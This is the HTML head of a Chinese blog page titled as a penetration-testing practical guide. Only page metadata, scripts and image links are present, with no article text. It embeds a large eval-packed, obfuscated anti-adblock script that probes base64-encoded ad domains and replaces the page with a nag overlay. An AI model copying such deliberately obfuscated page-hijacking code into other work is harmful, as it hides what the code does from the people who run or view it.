<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
<link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.css">  
<link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.min.css">  
<script>
    (function () {
        if ('') {
            if (prompt('请输入文章密码') !== '') {
                alert('密码错误！');
                if (history.length === 1) {
                    location.replace("http://www.idefun.com/blog"); // 这里替换成你的首页
                } else {
                    history.back();
                }
            }
        }
    })();
</script>
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="google-site-verification" content="gbB1uigphP0qWh_VtMmhQ2-LGLPmOFHuwcKrQ31yGXk">
  <meta name="msvalidate.01" content="0506017C2467A2086FFB31327D64F9DD">
  <meta name="baidu-site-verification" content="code-iOAnQ9ZrIU">

  <meta name="sogou_site_verification" content="gk7ca2RMLQ"/>


<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=EB Garamond:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-mac-osx.min.css">
  <script src="/lib/pace/pace.min.js"></script>
<script type="text/javascript"  charset="utf-8">
// Place this code snippet near the footer of your page before the close of the /body tag
// LEGAL NOTICE: The content of this website and all associated program code are protected under the Digital Millennium Copyright Act. Intentionally circumventing this code may constitute a violation of the DMCA.
                            
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}(';q O=\'\',27=\'1Z\';1O(q i=0;i<12;i++)O+=27.X(C.J(C.N()*27.G));q 2A=8,2j=4j,2H=4k,2L=4l,2D=D(t){q i=!1,r=D(){z(k.1h){k.2X(\'2R\',e);F.2X(\'1S\',e)}R{k.2J(\'2T\',e);F.2J(\'24\',e)}},e=D(){z(!i&&(k.1h||4m.2P===\'1S\'||k.2O===\'2Q\')){i=!0;r();t()}};z(k.2O===\'2Q\'){t()}R z(k.1h){k.1h(\'2R\',e);F.1h(\'1S\',e)}R{k.2U(\'2T\',e);F.2U(\'24\',e);q n=!1;2I{n=F.4o==4i&&k.1W}32(o){};z(n&&n.38){(D a(){z(i)H;2I{n.38(\'13\')}32(e){H 4p(a,50)};i=!0;r();t()})()}}};F[\'\'+O+\'\']=(D(){q t={t$:\'1Z+/=\',4r:D(e){q a=\'\',d,n,i,c,s,l,r,o=0;e=t.e$(e);1e(o<e.G){d=e.16(o++);n=e.16(o++);i=e.16(o++);c=d>>2;s=(d&3)<<4|n>>4;l=(n&15)<<2|i>>6;r=i&63;z(36(n)){l=r=64}R z(36(i)){r=64};a=a+10.t$.X(c)+10.t$.X(s)+10.t$.X(l)+10.t$.X(r)};H a},11:D(e){q n=\'\',d,l,c,s,o,r,a,i=0;e=e.1p(/[^A-4s-4t-9\\+\\/\\=]/g,\'\');1e(i<e.G){s=10.t$.1L(e.X(i++));o=10.t$.1L(e.X(i++));r=10.t$.1L(e.X(i++));a=10.t$.1L(e.X(i++));d=s<<2|o>>4;l=(o&15)<<4|r>>2;c=(r&3)<<6|a;n=n+S.T(d);z(r!=64){n=n+S.T(l)};z(a!=64){n=n+S.T(c)}};n=t.n$(n);H n},e$:D(t){t=t.1p(/;/g,\';\');q n=\'\';1O(q i=0;i<t.G;i++){q e=t.16(i);z(e<1r){n+=S.T(e)}R z(e>4u&&e<4v){n+=S.T(e>>6|4w);n+=S.T(e&63|1r)}R{n+=S.T(e>>12|2n);n+=S.T(e>>6&63|1r);n+=S.T(e&63|1r)}};H n},n$:D(t){q i=\'\',e=0,n=4x=1w=0;1e(e<t.G){n=t.16(e);z(n<1r){i+=S.T(n);e++}R z(n>4q&&n<2n){1w=t.16(e+1);i+=S.T((n&31)<<6|1w&63);e+=2}R{1w=t.16(e+1);2k=t.16(e+2);i+=S.T((n&15)<<12|(1w&63)<<6|2k&63);e+=3}};H i}};q a=[\'4g==\',\'48\',\'4f=\',\'41\',\'42\',\'43=\',\'44=\',\'45=\',\'46\',\'3Z\',\'47=\',\'49=\',\'4a\',\'4b\',\'4c=\',\'4d\',\'4e=\',\'4y=\',\'4h=\',\'4z=\',\'4T=\',\'4V=\',\'4W==\',\'4X==\',\'4Y==\',\'4Z==\',\'51=\',\'4U\',\'52\',\'54\',\'55\',\'56\',\'57\',\'58==\',\'59=\',\'5a=\',\'53=\',\'4S==\',\'5b=\',\'4J\',\'4R=\',\'4C=\',\'4D==\',\'4E=\',\'4F==\',\'4G==\',\'4H=\',\'4B=\',\'4I\',\'4K==\',\'4L==\',\'4M\',\'4N==\',\'4O=\'],f=C.J(C.N()*a.G),w=t.11(a[f]),Y=w,M=1,W=\'#4P\',o=\'#4Q\',g=\'#4A\',p=\'#3Y\',A=\'\',b=\'欢迎来到3G的小破站\',v=\'我们检测到您开启了广告拦截插件,希望您能够关闭\',y=\'不必担心,这些广告并不会影响您的阅读体验\',s=\'理解万岁\',i=0,u=1,n=\'3W.39\',l=0,L=e()+\'.2o\';D h(t){z(t)t=t.1K(t.G-15);q i=k.2h(\'3b\');1O(q n=i.G;n--;){q e=S(i[n].1H);z(e)e=e.1K(e.G-15);z(e===t)H!0};H!1};D m(t){z(t)t=t.1K(t.G-15);q e=k.3c;x=0;1e(x<e.G){1l=e[x].1n;z(1l)1l=1l.1K(1l.G-15);z(1l===t)H!0;x++};H!1};D e(t){q n=\'\',i=\'1Z\';t=t||30;1O(q e=0;e<t;e++)n+=i.X(C.J(C.N()*i.G));H n};D r(i){q r=[\'3l\',\'3m==\',\'3s\',\'3r\',\'2B\',\'3q==\',\'3t=\',\'3o==\',\'3n=\',\'3j==\',\'3i==\',\'3h==\',\'3f\',\'3e\',\'3d\',\'2B\'],o=[\'2v=\',\'3a==\',\'3p==\',\'3v==\',\'3J=\',\'3V\',\'3U=\',\'3T=\',\'2v=\',\'3u\',\'3S==\',\'3R\',\'3Q==\',\'3P==\',\'3O==\',\'3M=\'];x=0;1Q=[];1e(x<i){c=r[C.J(C.N()*r.G)];d=o[C.J(C.N()*o.G)];c=t.11(c);d=t.11(d);q a=C.J(C.N()*2)+1;z(a==1){n=\'//\'+c+\'/\'+d}R{n=\'//\'+c+\'/\'+e(C.J(C.N()*20)+4)+\'.2o\'};1Q[x]=21 23();1Q[x].1T=D(){q t=1;1e(t<7){t++}};1Q[x].1H=n;x++}};D Z(t){};H{33:D(t,o){z(3K k.K==\'3I\'){H};q i=\'0.1\',o=Y,e=k.1a(\'1v\');e.14=o;e.j.1j=\'1I\';e.j.13=\'-1i\';e.j.V=\'-1i\';e.j.1b=\'28\';e.j.U=\'3w\';q d=k.K.2g,a=C.J(d.G/2);z(a>15){q n=k.1a(\'29\');n.j.1j=\'1I\';n.j.1b=\'1u\';n.j.U=\'1u\';n.j.V=\'-1i\';n.j.13=\'-1i\';k.K.3H(n,k.K.2g[a]);n.1c(e);q r=k.1a(\'1v\');r.14=\'2d\';r.j.1j=\'1I\';r.j.13=\'-1i\';r.j.V=\'-1i\';k.K.1c(r)}R{e.14=\'2d\';k.K.1c(e)};l=3E(D(){z(e){t((e.1V==0),i);t((e.1X==0),i);t((e.1E==\'2E\'),i);t((e.1J==\'2l\'),i);t((e.1R==0),i)}R{t(!0,i)}},26)},1N:D(e,c){z((e)&&(i==0)){i=1;F[\'\'+O+\'\'].1B();F[\'\'+O+\'\'].1N=D(){H}}R{q y=t.11(\'3D\'),u=k.3C(y);z((u)&&(i==0)){z((2j%3)==0){q l=\'3y=\';l=t.11(l);z(h(l)){z(u.1P.1p(/\\s/g,\'\').G==0){i=1;F[\'\'+O+\'\'].1B()}}}};q f=!1;z(i==0){z((2H%3)==0){z(!F[\'\'+O+\'\'].2c){q d=[\'3x==\',\'3z==\',\'3A=\',\'3B=\',\'3F=\'],m=d.G,o=d[C.J(C.N()*m)],a=o;1e(o==a){a=d[C.J(C.N()*m)]};o=t.11(o);a=t.11(a);r(C.J(C.N()*2)+1);q n=21 23(),s=21 23();n.1T=D(){r(C.J(C.N()*2)+1);s.1H=a;r(C.J(C.N()*2)+1)};s.1T=D(){i=1;r(C.J(C.N()*3)+1);F[\'\'+O+\'\'].1B()};n.1H=o;z((2L%3)==0){n.24=D(){z((n.U<8)&&(n.U>0)){F[\'\'+O+\'\'].1B()}}};r(C.J(C.N()*3)+1);F[\'\'+O+\'\'].2c=!0};F[\'\'+O+\'\'].1N=D(){H}}}}},1B:D(){z(u==1){q Q=2S.5J(\'2M\');z(Q>0){H!0}R{2S.6C(\'2M\',(C.N()+1)*26)}};q h=\'6J==\';h=t.11(h);z(!m(h)){q c=k.1a(\'6P\');c.1Y(\'6O\',\'6N\');c.1Y(\'2P\',\'1g/6M\');c.1Y(\'1n\',h);k.2h(\'6L\')[0].1c(c)};6K(l);k.K.1P=\'\';k.K.j.17+=\'P:1u !19\';k.K.j.17+=\'1t:1u !19\';q L=k.1W.1X||F.35||k.K.1X,f=F.6I||k.K.1V||k.1W.1V,a=k.1a(\'1v\'),M=e();a.14=M;a.j.1j=\'2q\';a.j.13=\'0\';a.j.V=\'0\';a.j.U=L+\'1z\';a.j.1b=f+\'1z\';a.j.2f=W;a.j.1U=\'6E\';k.K.1c(a);q d=\'<a 1n="6t://6D.6B"><2z 14="2y" U="2r" 1b="40"><2u 14="2x" U="2r" 1b="40" 6R:1n="6z:2u/6y;6x,6w+6v+6u+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+B+6Q+6F+6S/6Z/77/78/5d/7b+/7c/7a+79/74+6T/73/72/71/6Y/6X/6V+6U/6W+70+76+75+6G+6s/5N+6q/5x+5y/5z+5A+5B+5C+5w/5D+5F/5G/5H/5I+6r+5K/5E+5u+5m+5t+E+5f/5g/5h/5i/5j/5k/+5e/5l++5n/5o/5p+5q/5r+5s+5L==">;</2z></a>\';d=d.1p(\'2y\',e());d=d.1p(\'2x\',e());q r=k.1a(\'1v\');r.1P=d;r.j.1j=\'1I\';r.j.1y=\'1M\';r.j.13=\'1M\';r.j.U=\'5M\';r.j.1b=\'69\';r.j.1U=\'2i\';r.j.1R=\'.6\';r.j.2e=\'2p\';r.1h(\'6c\',D(){n=n.6d(\'\').6e().6f(\'\');F.2V.1n=\'//\'+n});k.1F(M).1c(r);q i=k.1a(\'1v\'),Z=e();i.14=Z;i.j.1j=\'2q\';i.j.V=f/7+\'1z\';i.j.6g=L-6a+\'1z\';i.j.6h=f/3.5+\'1z\';i.j.2f=\'#6j\';i.j.1U=\'2i\';i.j.17+=\'I-1m: "6l 6m", 1s, 1q, 1o-1C !19\';i.j.17+=\'6n-1b: 6o !19\';i.j.17+=\'I-1k: 6p !19\';i.j.17+=\'1g-1A: 1x !19\';i.j.17+=\'1t: 6i !19\';i.j.1E+=\'37\';i.j.2Y=\'1M\';i.j.68=\'1M\';i.j.67=\'2w\';k.K.1c(i);i.j.5Q=\'1u 5R 5S -5T 5U(0,0,0,0.3)\';i.j.1J=\'2C\';q x=30,Y=22,w=18,A=18;z((F.35<2Z)||(5O.U<2Z)){i.j.2W=\'50%\';i.j.17+=\'I-1k: 5V !19\';i.j.2Y=\'5X;\';r.j.2W=\'65%\';q x=22,Y=18,w=12,A=12};i.1P=\'<2K j="1f:#5Z;I-1k:\'+x+\'1D;1f:\'+o+\';I-1m:1s, 1q, 1o-1C;I-1G:61;P-V:1d;P-1y:1d;1g-1A:1x;">\'+b+\'</2K><2N j="I-1k:\'+Y+\'1D;I-1G:62;I-1m:1s, 1q, 1o-1C;1f:\'+o+\';P-V:1d;P-1y:1d;1g-1A:1x;">\'+v+\'</2N><66 j=" 1E: 37;P-V: 0.34;P-1y: 0.34;P-13: 2b;P-2G: 2b; 2t:6H 3X #5Y; U: 25%;1g-1A:1x;"><p j="I-1m:1s, 1q, 1o-1C;I-1G:2s;I-1k:\'+w+\'1D;1f:\'+o+\';1g-1A:1x;">\'+y+\'</p><p j="P-V:5P;"><29 5W="10.j.1R=.9;" 6k="10.j.1R=1;"  14="\'+e()+\'" j="2e:2p;I-1k:\'+A+\'1D;I-1m:1s, 1q, 1o-1C; I-1G:2s;2t-6b:2w;1t:1d;5v-1f:\'+g+\';1f:\'+p+\';1t-13:28;1t-2G:28;U:60%;P:2b;P-V:1d;P-1y:1d;" 6A="F.2V.5c();">\'+s+\'</29></p>\'}}})();F.2F=D(t,e){q n=3g.3N,i=F.3L,a=n(),r,o=D(){n()-a<e?r||i(o):t()};i(o);H{3k:D(){r=1}}};q 2m;z(k.K){k.K.j.1J=\'2C\'};2D(D(){z(k.1F(\'2a\')){k.1F(\'2a\').j.1J=\'2E\';k.1F(\'2a\').j.1E=\'2l\'};2m=F.2F(D(){F[\'\'+O+\'\'].33(F[\'\'+O+\'\'].1N,F[\'\'+O+\'\'].4n)},2A*26)});',62,447,'|||||||||||||||||||style|document||||||var|||||||||if||vr6|Math|function||window|length|return|font|floor|body|||random|slnLxiVzuris|margin||else|String|fromCharCode|width|top||charAt|||this|decode||left|id||charCodeAt|cssText||important|createElement|height|appendChild|10px|while|color|text|addEventListener|5000px|position|size|thisurl|family|href|sans|replace|geneva|128|Helvetica|padding|0px|DIV|c2|center|bottom|px|align|esyreWzZvU|serif|pt|display|getElementById|weight|src|absolute|visibility|substr|indexOf|30px|HAKFnObYSb|for|innerHTML|spimg|opacity|load|onerror|zIndex|clientHeight|documentElement|clientWidth|setAttribute|ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789||new||Image|onload||1000|cIqYebvrVP|60px|div|babasbmsgx|auto|ranAlready|banner_ad|cursor|backgroundColor|childNodes|getElementsByTagName|10000|weJxFhMEnO|c3|none|iJnITMGKUw|224|jpg|pointer|fixed|160|300|border|image|ZmF2aWNvbi5pY28|15px|FILLVECTID2|FILLVECTID1|svg|lWuKnyHNyc|cGFydG5lcmFkcy55c20ueWFob28uY29t|visible|MwqxcDmdBe|hidden|fNbAypZfcx|right|cvyqescLdX|try|detachEvent|h3|hDEauJVOaV|babn|h1|readyState|type|complete|DOMContentLoaded|sessionStorage|onreadystatechange|attachEvent|location|zoom|removeEventListener|marginLeft|640|||catch|AHTQfVurZV|5em|innerWidth|isNaN|block|doScroll|kcolbdakcolb|YmFubmVyLmpwZw|script|styleSheets|YXMuaW5ib3guY29t|YWRzYXR0LmVzcG4uc3RhcndhdmUuY29t|YWRzYXR0LmFiY25ld3Muc3RhcndhdmUuY29t|Date|YWRzLnp5bmdhLmNvbQ|YWRzLnlhaG9vLmNvbQ|cHJvbW90ZS5wYWlyLmNvbQ|clear|YWRuLmViYXkuY29t|YWQubWFpbC5ydQ|Y2FzLmNsaWNrYWJpbGl0eS5jb20|YWR2ZXJ0aXNpbmcuYW9sLmNvbQ|NDY4eDYwLmpwZw|YS5saXZlc3BvcnRtZWRpYS5ldQ|YWQuZm94bmV0d29ya3MuY29t|anVpY3lhZHMuY29t|YWdvZGEubmV0L2Jhbm5lcnM|YWQtbGFyZ2UucG5n|NzIweDkwLmpwZw|468px|Ly93d3cuZ29vZ2xlLmNvbS9hZHNlbnNlL3N0YXJ0L2ltYWdlcy9mYXZpY29uLmljbw|Ly9wYWdlYWQyLmdvb2dsZXN5bmRpY2F0aW9uLmNvbS9wYWdlYWQvanMvYWRzYnlnb29nbGUuanM|Ly93d3cuZ3N0YXRpYy5jb20vYWR4L2RvdWJsZWNsaWNrLmljbw|Ly9hZHZlcnRpc2luZy55YWhvby5jb20vZmF2aWNvbi5pY28|Ly9hZHMudHdpdHRlci5jb20vZmF2aWNvbi5pY28|querySelector|aW5zLmFkc2J5Z29vZ2xl|setInterval|Ly93d3cuZG91YmxlY2xpY2tieWdvb2dsZS5jb20vZmF2aWNvbi5pY28|IdeFun|insertBefore|undefined|c2t5c2NyYXBlci5qcGc|typeof|requestAnimationFrame|YWR2ZXJ0aXNlbWVudC0zNDMyMy5qcGc|now|d2lkZV9za3lzY3JhcGVyLmpwZw|bGFyZ2VfYmFubmVyLmdpZg|YmFubmVyX2FkLmdpZg|ZmF2aWNvbjEuaWNv|c3F1YXJlLWFkLnBuZw|Q0ROLTMzNC0xMDktMTM3eC1hZC1iYW5uZXI|YWRjbGllbnQtMDAyMTQ3LWhvc3QxLWJhbm5lci1hZC5qcGc|MTM2N19hZC1jbGllbnRJRDI0NjQuanBn|moc|solid|ffffff|YWQtY29udGFpbmVy||YWQtaGVhZGVy|YWQtaW1n|YWQtaW5uZXI|YWQtbGFiZWw|YWQtbGI|YWQtZm9vdGVy|YWQtY29udGFpbmVyLTE|YWRCYW5uZXJXcmFw|YWQtY29udGFpbmVyLTI|QWQzMDB4MTQ1|QWQzMDB4MjUw|QWQ3Mjh4OTA|QWRBcmVh|QWRGcmFtZTE|YWQtZnJhbWU|YWQtbGVmdA|QWRGcmFtZTM|null|172|166|301|event|HQAkyXQhPP|frameElement|setTimeout|191|encode|Za|z0|127|2048|192|c1|QWRGcmFtZTI|QWRGcmFtZTQ|adb8ff|YmFubmVyaWQ|YWRiYW5uZXI|YWRBZA|YmFubmVyYWQ|IGFkX2JveA|YWRfY2hhbm5lbA|YWRzZXJ2ZXI|YWRzbG90|YmFubmVyX2Fk|cG9wdXBhZA|YWRzZW5zZQ|Z29vZ2xlX2Fk|b3V0YnJhaW4tcGFpZA|c3BvbnNvcmVkX2xpbms|95d1d6|962396|YWRCYW5uZXI|Z2xpbmtzd3JhcHBlcg|QWRMYXllcjE|RGl2QWQx|QWRMYXllcjI|QWRzX2dvb2dsZV8wMQ|QWRzX2dvb2dsZV8wMg|QWRzX2dvb2dsZV8wMw|QWRzX2dvb2dsZV8wNA||RGl2QWQ|RGl2QWQy|QWRDb250YWluZXI|RGl2QWQz|RGl2QWRB|RGl2QWRC|RGl2QWRD|QWRJbWFnZQ|QWREaXY|QWRCb3gxNjA|YWRUZWFzZXI|reload|aa2thYWHXUFDUPDzUOTno0dHipqbceHjaZ2dCQkLSLy|QhZLYLN54|MjA3XJUKy|SRWhNsmOazvKzQYcE0hV5nDkuQQKfUgm4HmqA2yuPxfMU1m4zLRTMAqLhN6BHCeEXMDo2NsY8MdCeBB6JydMlps3uGxZefy7EO1vyPvhOxL7TPWjVUVvZkNJ|CGf7SAP2V6AjTOUa8IzD3ckqe2ENGulWGfx9VKIBB72JM1lAuLKB3taONCBn3PY0II5cFrLr7cCp|UIWrdVPEp7zHy7oWXiUgmR3kdujbZI73kghTaoaEKMOh8up2M8BVceotd|BNyENiFGe5CxgZyIT6KVyGO2s5J5ce|14XO7cR5WV1QBedt3c|e8xr8n5lpXyn|1HX6ghkAR9E5crTgM|u3T9AbDjXwIMXfxmsarwK9wUBB5Kj8y2dCw|Kq8b7m0RpwasnR|uJylU|dEflqX6gzC4hd1jSgz0ujmPkygDjvNYDsU0ZggjKBqLPrQLfDUQIzxMBtSOucRwLzrdQ2DFO0NDdnsYq0yoJyEB0FHTBHefyxcyUy8jflH7sHszSfgath4hYwcD3M29I5DMzdBNO2IFcC5y6HSduof4G5dQNMWd4cDcjNNeNGmb02|Uv0LfPzlsBELZ|3eUeuATRaNMs0zfml|0t6qjIlZbzSpemi|j9xJVBEEbWEXFVZQNX9|background|UADVgvxHBzP9LUufqQDtV|BKpxaqlAOvCqBjzTFAp2NFudJ5paelS5TbwtBlAvNgEdeEGI6O6JUt42NhuvzZvjXTHxwiaBXUIMnAKa5Pq9SL3gn1KAOEkgHVWBIMU14DBF2OH3KOfQpG2oSQpKYAEdK0MGcDg1xbdOWy|iqKjoRAEDlZ4soLhxSgcy6ghgOy7EeC2PI4DHb7pO7mRwTByv5hGxF|I1TpO7CnBZO|QcWrURHJSLrbBNAxZTHbgSCsHXJkmBxisMvErFVcgE|h0GsOCs9UwP2xo6|UimAyng9UePurpvM8WmAdsvi6gNwBMhPrPqemoXywZs8qL9JZybhqF6LZBZJNANmYsOSaBTkSqcpnCFEkntYjtREFlATEtgxdDQlffhS3ddDAzfbbHYPUDGJpGT|uI70wOsgFWUQCfZC1UI0Ettoh66D|E5HlQS6SHvVSU0V|szSdAtKtwkRRNnCIiDzNzc0RO|kmLbKmsE|pyQLiBu8WDYgxEZMbeEqIiSM8r|x0z6tauQYvPxwT0VM1lH9Adt5Lp|getItem|bTplhb|gkJocgFtzfMzwAAAABJRU5ErkJggg|160px|KmSx|screen|35px|boxShadow|14px|24px|8px|rgba|18pt|onmouseover|45px|CCC|999||200|500||||hr|borderRadius|marginRight|40px|120|radius|click|split|reverse|join|minWidth|minHeight|12px|fff|onmouseout|Arial|Black|line|normal|16pt|0nga14QJ3GOWqDmOwJgRoSme8OOhAQqiUhPMbUGksCj5Lta4CbeFhX9NN0Tpny|F2Q|uWD20LsNIDdQut4LXA|http|sAAADr6|1BMVEXr6|iVBORw0KGgoAAAANSUhEUgAAAKAAAAAoCAMAAABO8gGqAAAB|base64|png|data|onclick|com|setItem|blockadblock|9999|enp7TNTUoJyfm5ualpaV5eXkODg7k5OTaamoqKSnc3NzZ2dmHh4dra2tHR0fVQUFAQEDPExPNBQXo6Ohvb28ICAjp19fS0tLnzc29vb25ubm1tbWWlpaNjY3dfX1oaGhUVFRMTEwaGhoXFxfq5ubh4eHe3t7Hx8fgk5PfjY3eg4OBgYF|YbUMNVjqGySwrRUGsLu6|1px|innerHeight|Ly95dWkueWFob29hcGlzLmNvbS8zLjE4LjEvYnVpbGQvY3NzcmVzZXQvY3NzcmVzZXQtbWluLmNzcw|clearInterval|head|css|stylesheet|rel|link|sAAADMAAAsKysKCgokJCRycnIEBATq6uoUFBTMzMzr6urjqqoSEhIGBgaxsbHcd3dYWFg0NDTmw8PZY2M5OTkfHx|xlink|fn5EREQ9PT3SKSnV1dXks7OsrKypqambmpqRkZFdXV1RUVHRISHQHR309PTq4eHp3NzPz8|MgzNFaCVyHVIONbx1EDrtCzt6zMEGzFzFwFZJ19jpJy2qx5BcmyBM|EuJ0GtLUjVftvwEYqmaR66JX9Apap6cCyKhiV|0idvgbrDeBhcK|RUIrwGk|wd4KAnkmbaePspA|HY9WAzpZLSSCNQrZbGO1n4V4h9uDP7RTiIIyaFQoirfxCftiht4sK8KeKqPh34D2S7TsROHRiyMrAxrtNms9H5Qaw9ObU1H4Wdv8z0J8obvOo|Ly8vKysrDw8O4uLjkt7fhnJzgl5d7e3tkZGTYVlZPT08vLi7OCwu|qdWy60K14k|VOPel7RIdeIBkdo|Lnx0tILMKp3uvxI61iYH33Qq3M24k|oGKmW8DAFeDOxfOJM4DcnTYrtT7dhZltTW7OXHB1ClEWkPO0JmgEM1pebs5CcA2UCTS6QyHMaEtyc3LAlWcDjZReyLpKZS9uT02086vu0tJa|ISwIz5vfQyDF3X|1FMzZIGQR3HWJ4F1TqWtOaADq0Z9itVZrg1S6JLi7B1MAtUCX1xNB0Y0oL9hpK4|CXRTTQawVogbKeDEs2hs4MtJcNVTY2KgclwH2vYODFTa4FQ|v792dnbbdHTZYWHZXl7YWlpZWVnVRkYnJib8|PzNzc3myMjlurrjsLDhoaHdf3|cIa9Z8IkGYa9OGXPJDm5RnMX5pim7YtTLB24btUKmKnZeWsWpgHnzIP5UucvNoDrl8GUrVyUBM4xqQ|ejIzabW26SkqgMDA7HByRAADoM7kjAAAAInRSTlM6ACT4xhkPtY5iNiAI9PLv6drSpqGYclpM5bengkQ8NDAnsGiGMwAABetJREFUWMPN2GdTE1EYhmFQ7L339rwngV2IiRJNIGAg1SQkFAHpgnQpKnZBAXvvvXf9mb5nsxuTqDN|v7|b29vlvb2xn5'.split('|'),0,{}));
</script>

<script data-ad-client="ca-pub-8879606278129720" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<meta name="shenma-site-verification" content="c0370ff006028f3b3143a30a3bf27c41_1616242258">
<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.idefun.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true,"b2t":false,"scrollpercent":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="渗透测试实战指南">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透测试实战指南">
<meta property="og:url" content="http://www.idefun.com/article/8240bef7.html">
<meta property="og:site_name" content="IdeFun">
<meta property="og:description" content="渗透测试实战指南">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/05/12/tvUKdMEkLob1z96.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711143031706.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711143817878.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711145601887.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210711145728862.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/mEcBXU3rwgNjDGo.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/LPQmOYiM9laxuNZ.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/gtxIL69c3DOPjiH.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/EgpWPxyozJOCbXk.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/12Q5rDLZIb6dVnv.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/EbY7sNiQvn5lA6u.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/8tx7sZk9n5RJrvV.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/t9esV3JIkX6LbHx.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/XGtoPSdup8I2D19.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/MsniFYa9w6fgpHo.png">
<meta property="og:image" content="https://i.loli.net/2021/05/16/yY9CNxk6QO8nlEM.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210516120022385.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210516120134680.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712072812958.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074450202.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074532948.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074558835.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712080248534.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712080643727.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085718822.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085118209.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085423236.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085623439.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085912318.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712083949109.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712084213833.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712084355147.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712090051908.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712090442765.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712095117059.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712143952557.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144436805.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144525432.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144648105.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144959242.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712145517002.png">
